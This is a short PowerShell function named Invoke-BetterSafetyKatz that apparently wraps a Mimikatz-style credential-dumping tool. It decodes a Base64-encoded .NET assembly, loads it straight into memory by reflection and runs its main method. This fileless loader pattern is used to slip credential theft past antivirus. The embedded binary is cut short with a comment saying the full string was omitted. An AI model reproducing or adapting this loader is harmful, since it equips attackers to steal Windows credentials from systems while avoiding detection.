function Invoke-BetterSafetyKatz
{
    $base64binary="TVqQAAMAAAAEAAAA//8AALgAAAAA...AAAAAAAAAAAAA=" # NOTE: The actual 137900-character Base64 string omitted for readability.
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [BetterS4fetyK4tz.Program]::main()
}
